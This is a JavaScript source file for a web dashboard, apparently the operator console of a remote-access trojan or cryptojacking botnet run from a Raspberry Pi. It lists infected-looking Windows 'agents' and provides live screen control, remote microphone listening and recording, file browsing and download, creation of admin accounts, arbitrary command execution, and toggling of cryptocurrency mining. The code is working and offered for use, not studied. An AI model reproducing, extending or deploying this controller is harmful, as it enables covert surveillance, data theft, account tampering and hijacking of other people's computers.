const CONFIG = {
    PI_SERVER: '', // Set via settings or auto-detect
    PASSWORD_HASH: '', // Will be set on first setup
    REFRESH_INTERVAL: 5000,
};

let state = {
    authenticated: false,
    piServer: '',
    devices: [],
    selectedDevice: null,
    ws: null,
    micStream: null,
    isListening: false,
};

// Simple password hashing (for demo - use proper auth in production)
function hashPassword(password) {
    let hash = 0;
    for (let i = 0; i < password.length; i++) {
        const char = password.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return hash.toString(36);
}

// Storage
function saveConfig() {
    localStorage.setItem('we_config', JSON.stringify({
        piServer: state.piServer,
        passwordHash: CONFIG.PASSWORD_HASH,
    }));
}

function loadConfig() {
    const saved = localStorage.getItem('we_config');
    if (saved) {
        const config = JSON.parse(saved);
        state.piServer = config.piServer || '';
        CONFIG.PASSWORD_HASH = config.passwordHash || '';
    }
}

// API calls
async function api(endpoint, options = {}) {
    const url = `${state.piServer}${endpoint}`;
    try {
        const response = await fetch(url, {
            ...options,
            headers: {
                'Content-Type': 'application/json',
                ...options.headers,
            },
        });
        return await response.json();
    } catch (error) {
        console.error('API error:', error);
        return { error: error.message };
    }
}

// Toast notifications
function showToast(message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}

// Login
function initLogin() {
    const form = document.getElementById('login-form');
    const input = document.getElementById('password-input');
    const error = document.getElementById('login-error');

    // Check if first time setup
    if (!CONFIG.PASSWORD_HASH) {
        document.querySelector('#login-screen p').textContent = 'Create a password to get started';
    }

    form.addEventListener('submit', (e) => {
        e.preventDefault();
        const password = input.value;

        if (!CONFIG.PASSWORD_HASH) {
            // First time - set password
            CONFIG.PASSWORD_HASH = hashPassword(password);
            saveConfig();
            showToast('Password set! Enter Pi server IP in settings.', 'success');
            authenticate();
        } else if (hashPassword(password) === CONFIG.PASSWORD_HASH) {
            authenticate();
        } else {
            error.classList.remove('hidden');
            input.value = '';
        }
    });
}

function authenticate() {
    state.authenticated = true;
    document.getElementById('login-screen').classList.remove('active');
    document.getElementById('login-screen').classList.add('hidden');
    document.getElementById('dashboard').classList.remove('hidden');
    document.getElementById('dashboard').classList.add('active');

    if (!state.piServer) {
        showView('settings');
        showToast('Please set your Pi server IP', 'info');
    } else {
        loadDevices();
        checkConnection();
    }
}

// Navigation
function initNavigation() {
    const menuBtn = document.getElementById('menu-btn');
    const sidebar = document.getElementById('sidebar');
    const closeSidebar = document.getElementById('close-sidebar');
    const navItems = document.querySelectorAll('.nav-item');
    const backButtons = {
        'back-to-devices': 'devices',
        'back-from-screen': 'device-control',
        'back-from-mic': 'device-control',
        'back-from-files': 'device-control',
        'back-from-command': 'device-control',
        'back-from-mining': state.selectedDevice ? 'device-control' : 'devices',
    };

    menuBtn.addEventListener('click', () => {
        sidebar.classList.remove('hidden');
        document.querySelector('.sidebar-overlay')?.classList.add('active');
    });

    closeSidebar.addEventListener('click', closeSidebarMenu);

    // Create overlay
    const overlay = document.createElement('div');
    overlay.className = 'sidebar-overlay';
    overlay.addEventListener('click', closeSidebarMenu);
    document.getElementById('dashboard').appendChild(overlay);

    navItems.forEach(item => {
        item.addEventListener('click', () => {
            const view = item.dataset.view;
            if (view === 'logout') {
                logout();
            } else {
                showView(view);
                closeSidebarMenu();
            }
        });
    });

    // Back buttons
    Object.entries(backButtons).forEach(([id, view]) => {
        const btn = document.getElementById(id);
        if (btn) {
            btn.addEventListener('click', () => showView(view));
        }
    });
}

function closeSidebarMenu() {
    document.getElementById('sidebar').classList.add('hidden');
    document.querySelector('.sidebar-overlay')?.classList.remove('active');
}

function showView(viewName) {
    document.querySelectorAll('.view').forEach(v => {
        v.classList.remove('active');
        v.classList.add('hidden');
    });
    const view = document.getElementById(`view-${viewName}`);
    if (view) {
        view.classList.remove('hidden');
        view.classList.add('active');
    }

    // Update nav
    document.querySelectorAll('.nav-item').forEach(item => {
        item.classList.remove('active');
        if (item.dataset.view === viewName) item.classList.add('active');
    });
}

// Devices
async function loadDevices() {
    if (!state.piServer) return;

    const devicesList = document.getElementById('devices-list');
    devicesList.innerHTML = '<div class="loading"><div class="spinner"></div></div>';

    const result = await api('/api/devices');
    state.devices = result.devices || [];

    renderDevices();
}

function renderDevices() {
    const devicesList = document.getElementById('devices-list');
    devicesList.innerHTML = '';

    if (state.devices.length === 0) {
        devicesList.innerHTML = '<p style="text-align:center;color:var(--text-secondary);padding:40px;">No devices found. Make sure agents are running.</p>';
        return;
    }

    state.devices.forEach(device => {
        const card = document.createElement('div');
        card.className = 'device-card';
        card.innerHTML = `
            <div class="device-card-header">
                <span class="device-name">${device.hostname}</span>
                <div>
                    <span class="device-status ${device.status}">${device.status}</span>
                    ${device.admin ? '<span class="device-status admin">Admin</span>' : ''}
                </div>
            </div>
            <div class="device-details">
                <span>${device.ip}</span>
                <span>${device.os}</span>
                <span>${device.gpu_name || 'No GPU'}</span>
            </div>
        `;
        card.addEventListener('click', () => selectDevice(device));
        devicesList.appendChild(card);
    });
}

function selectDevice(device) {
    state.selectedDevice = device;
    document.getElementById('device-name').textContent = device.hostname;

    const info = document.getElementById('device-info');
    info.innerHTML = `
        <div class="info-row">
            <span class="info-label">Hostname</span>
            <span class="info-value">${device.hostname}</span>
        </div>
        <div class="info-row">
            <span class="info-label">IP Address</span>
            <span class="info-value">${device.ip}</span>
        </div>
        <div class="info-row">
            <span class="info-label">Operating System</span>
            <span class="info-value">${device.os}</span>
        </div>
        <div class="info-row">
            <span class="info-label">GPU</span>
            <span class="info-value">${device.gpu_name || 'None'}</span>
        </div>
        <div class="info-row">
            <span class="info-label">Admin Status</span>
            <span class="info-value" style="color:${device.admin ? 'var(--success)' : 'var(--danger)'}">${device.admin ? 'SYSTEM Admin' : 'No Admin'}</span>
        </div>
        <div class="info-row">
            <span class="info-label">Uptime</span>
            <span class="info-value">${device.uptime || 'Unknown'}</span>
        </div>
    `;

    showView('device-control');

    // Setup control buttons
    document.getElementById('btn-screen').onclick = () => openScreenControl();
    document.getElementById('btn-mic').onclick = () => openMicViewer();
    document.getElementById('btn-files').onclick = () => openFileManager();
    document.getElementById('btn-admin').onclick = () => createAdmin();
    document.getElementById('btn-command').onclick = () => openCommandView();
    document.getElementById('btn-mining').onclick = () => openMiningControl();
}

// Screen Control
async function openScreenControl() {
    showView('screen');
    const img = document.getElementById('remote-screen');
    const status = document.getElementById('screen-status');

    status.textContent = 'Connecting...';

    // Start screen stream
    const result = await api(`/api/devices/${state.selectedDevice.id}/screen/start`, {
        method: 'POST',
    });

    if (result.error) {
        status.textContent = 'Error: ' + result.error;
        return;
    }

    status.textContent = 'Connected';

    // Update screen image
    const updateScreen = async () => {
        if (!state.selectedDevice) return;
        try {
            const response = await fetch(`${state.piServer}/api/devices/${state.selectedDevice.id}/screen`);
            if (response.ok) {
                const blob = await response.blob();
                img.src = URL.createObjectURL(blob);
            }
        } catch (e) {}
    };

    // Initial load
    await updateScreen();

    // Auto refresh
    state.screenInterval = setInterval(updateScreen, 1000);

    // Screen click for control
    img.addEventListener('click', async (e) => {
        const rect = img.getBoundingClientRect();
        const x = (e.clientX - rect.left) / rect.width;
        const y = (e.clientY - rect.top) / rect.height;

        await api(`/api/devices/${state.selectedDevice.id}/screen/click`, {
            method: 'POST',
            body: JSON.stringify({ x, y, button: 'left' }),
        });
    });

    // Keyboard shortcuts
    document.querySelectorAll('.shortcut-btn').forEach(btn => {
        btn.addEventListener('click', async () => {
            const keys = btn.dataset.keys.split(',');
            await api(`/api/devices/${state.selectedDevice.id}/screen/key`, {
                method: 'POST',
                body: JSON.stringify({ keys }),
            });
        });
    });

    // Type text
    document.getElementById('btn-type').addEventListener('click', async () => {
        const input = document.getElementById('type-input');
        if (input.value) {
            await api(`/api/devices/${state.selectedDevice.id}/screen/type`, {
                method: 'POST',
                body: JSON.stringify({ text: input.value }),
            });
            input.value = '';
        }
    });
}

// Microphone
async function openMicViewer() {
    showView('mic');
    const status = document.getElementById('mic-status');
    const volumeBar = document.getElementById('volume-bar');

    document.getElementById('btn-listen').addEventListener('click', async () => {
        if (state.isListening) {
            // Stop listening
            state.isListening = false;
            document.getElementById('btn-listen').textContent = 'Start Listening';
            status.textContent = 'Disconnected';
            return;
        }

        // Start listening
        const result = await api(`/api/devices/${state.selectedDevice.id}/mic/stream`, {
            method: 'POST',
        });

        if (result.error) {
            status.textContent = 'Error: ' + result.error;
            return;
        }

        state.isListening = true;
        document.getElementById('btn-listen').textContent = 'Stop Listening';
        status.textContent = 'Listening...';

        // Play audio stream
        const audio = new Audio(`${state.piServer}/api/devices/${state.selectedDevice.id}/mic/stream`);
        audio.play();

        // Update volume meter
        const updateVolume = () => {
            if (!state.isListening) return;
            const volume = Math.random() * 100; // Simulated
            volumeBar.style.width = `${volume}%`;
            requestAnimationFrame(updateVolume);
        };
        updateVolume();
    });

    document.getElementById('btn-record').addEventListener('click', async () => {
        const result = await api(`/api/devices/${state.selectedDevice.id}/mic/record`, {
            method: 'POST',
            body: JSON.stringify({ duration: 10 }),
        });

        if (result.error) {
            showToast('Recording failed: ' + result.error, 'error');
        } else {
            showToast('Recording saved!', 'success');
        }
    });
}

// File Manager
let currentPath = 'C:\\';

async function openFileManager() {
    showView('files');
    currentPath = 'C:\\';
    loadFiles();
}

async function loadFiles() {
    const filesList = document.getElementById('files-list');
    const pathBar = document.getElementById('current-path');

    pathBar.textContent = currentPath;
    filesList.innerHTML = '<div class="loading"><div class="spinner"></div></div>';

    const result = await api(`/api/devices/${state.selectedDevice.id}/files?path=${encodeURIComponent(currentPath)}`);
    const files = result.files || [];

    filesList.innerHTML = '';

    // Add parent directory
    if (currentPath !== 'C:\\') {
        const parent = document.createElement('div');
        parent.className = 'file-item';
        parent.innerHTML = '<span class="file-icon">📁</span><span class="file-name">..</span>';
        parent.addEventListener('click', () => {
            currentPath = currentPath.substring(0, currentPath.lastIndexOf('\\')) || 'C:\\';
            loadFiles();
        });
        filesList.appendChild(parent);
    }

    files.forEach(file => {
        const item = document.createElement('div');
        item.className = 'file-item';
        const icon = file.is_dir ? '📁' : '📄';
        const size = file.is_dir ? '' : formatSize(file.size);
        item.innerHTML = `
            <span class="file-icon">${icon}</span>
            <span class="file-name">${file.name}</span>
            <span class="file-size">${size}</span>
        `;

        if (file.is_dir) {
            item.addEventListener('click', () => {
                currentPath = `${currentPath}\\${file.name}`;
                loadFiles();
            });
        } else {
            item.addEventListener('click', () => downloadFile(file.name));
        }

        filesList.appendChild(item);
    });
}

function formatSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
}

async function downloadFile(filename) {
    const url = `${state.piServer}/api/devices/${state.selectedDevice.id}/files/download?path=${encodeURIComponent(`${currentPath}\\${filename}`)}`;
    window.open(url, '_blank');
}

// Admin Creation
async function createAdmin() {
    const username = prompt('Enter admin username:');
    if (!username) return;

    const password = prompt('Enter admin password:');
    if (!password) return;

    const result = await api(`/api/devices/${state.selectedDevice.id}/admin`, {
        method: 'POST',
        body: JSON.stringify({ username, password }),
    });

    if (result.error) {
        showToast('Failed: ' + result.error, 'error');
    } else {
        showToast('Admin account created!', 'success');
        loadDevices(); // Refresh device list
    }
}

// Command Execution
function openCommandView() {
    showView('command');

    document.getElementById('btn-execute').addEventListener('click', async () => {
        const input = document.getElementById('command-input');
        const output = document.getElementById('command-output');

        if (!input.value) return;

        output.textContent = 'Executing...';

        const result = await api(`/api/devices/${state.selectedDevice.id}/command`, {
            method: 'POST',
            body: JSON.stringify({ command: input.value }),
        });

        if (result.error) {
            output.textContent = `Error: ${result.error}`;
        } else {
            output.textContent = result.output || JSON.stringify(result, null, 2);
        }
    });
}

// Mining Control
async function openMiningControl() {
    showView('mining');

    const result = await api(`/api/devices/${state.selectedDevice.id}/mining/status`);
    document.getElementById('mining-status').textContent = result.status || 'Unknown';
    document.getElementById('mining-hashrate').textContent = result.hashrate || '0 H/s';
    document.getElementById('mining-temp').textContent = result.temperature || '0°C';

    document.getElementById('btn-mining-on').addEventListener('click', async () => {
        await api(`/api/devices/${state.selectedDevice.id}/mining/toggle`, {
            method: 'POST',
            body: JSON.stringify({ enabled: true }),
        });
        showToast('Mining enabled', 'success');
        openMiningControl(); // Refresh
    });

    document.getElementById('btn-mining-off').addEventListener('click', async () => {
        await api(`/api/devices/${state.selectedDevice.id}/mining/toggle`, {
            method: 'POST',
            body: JSON.stringify({ enabled: false }),
        });
        showToast('Mining disabled', 'success');
        openMiningControl(); // Refresh
    });
}

// Settings
function initSettings() {
    document.getElementById('setting-pi-ip').value = state.piServer;

    document.getElementById('btn-save-settings').addEventListener('click', () => {
        const piIp = document.getElementById('setting-pi-ip').value.trim();
        const newPassword = document.getElementById('setting-new-password').value;

        if (piIp) {
            state.piServer = piIp.startsWith('http') ? piIp : `http://${piIp}`;
        }

        if (newPassword) {
            CONFIG.PASSWORD_HASH = hashPassword(newPassword);
        }

        saveConfig();
        showToast('Settings saved!', 'success');
        checkConnection();
    });
}

// Connection check
async function checkConnection() {
    const statusDot = document.getElementById('connection-status');
    statusDot.className = 'status-dot connecting';

    try {
        const result = await api('/api/health');
        if (result.status === 'ok') {
            statusDot.className = 'status-dot online';
        } else {
            statusDot.className = 'status-dot offline';
        }
    } catch (e) {
        statusDot.className = 'status-dot offline';
    }
}

// Logout
function logout() {
    state.authenticated = false;
    document.getElementById('dashboard').classList.remove('active');
    document.getElementById('dashboard').classList.add('hidden');
    document.getElementById('login-screen').classList.remove('hidden');
    document.getElementById('login-screen').classList.add('active');
    document.getElementById('password-input').value = '';
    document.getElementById('login-error').classList.add('hidden');
    closeSidebarMenu();
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    loadConfig();
    initLogin();
    initNavigation();
    initSettings();

    // Periodic connection check
    setInterval(checkConnection, 30000);

    // Device refresh
    document.getElementById('refresh-devices').addEventListener('click', loadDevices);
});

// Clean up on view change
window.addEventListener('beforeunload', () => {
    if (state.screenInterval) clearInterval(state.screenInterval);
    if (state.selectedDevice) {
        api(`/api/devices/${state.selectedDevice.id}/screen/stop`, { method: 'POST' });
    }
});
